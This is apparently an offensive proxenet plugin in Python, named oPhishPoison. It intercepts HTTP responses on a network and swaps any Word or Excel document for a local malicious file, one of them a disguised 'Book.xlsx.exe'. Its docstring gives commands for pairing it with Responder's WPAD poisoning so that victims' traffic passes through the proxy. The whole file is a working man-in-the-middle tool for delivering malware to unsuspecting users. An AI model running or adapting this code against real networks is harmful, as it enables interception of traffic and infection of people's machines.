"""
This script will inject malicious content.

How to use:
- Start proxenet and load this script (autoload or manually)
  ex: $ ln -sf proxenet-plugins/oPhishPoison.py proxenet-plugins/autoload/oPhishPoison.py
      $ ./proxenet -b 192.168.56.1 -p 8008
- Start Responder and point WPAD to proxenet
  ex: # ./Responder.py -v -w -I vboxnet0 -u 192.168.56.1:8008

Point
TODO:
- in request, detect filename from path
- fully automate the generation on-the-fly with https://gist.github.com/hugsy/18aa43255fd4d905a379
"""

__PLUGIN__ = "oPhishPoison"
__AUTHOR__ = "@_hugsy_"


from pimp import HTTPResponse

types = {"doc": "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
         "xls": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
         }


def is_supported_type(t):
    for k,v in types.iteritems():
        if v.lower() == t.lower():
            return k
    return None

def insert_malicious_word(http):
    with open("/home/chris/tmp/docs/PhpOperator.docx") as f:
        http.body = f.read()
    return

def insert_malicious_excel(http):
    with open("/home/chris/tmp/docs/Book.xlsx.exe") as f:
        http.body = f.read()
    return

def proxenet_request_hook(rid, request, uri):
    # todo
    return request

def proxenet_response_hook(rid, response, uri):
    try:
        http = HTTPResponse(response)

        if not http.has_header("Content-Type"):
            del(http)
            return response

        detected_type = is_supported_type( http.get_header("Content-Type") )
        if detected_type is None:
            del(http)
            return response

        if detected_type == "doc":
            insert_malicious_word(http)
        elif detected_type == "xls":
            insert_malicious_excel(http)

        print("Poisoining {} file in response {}: {}".format(detected_type, rid, http.headers))
        return http.render()

    except Exception as e :
        return response
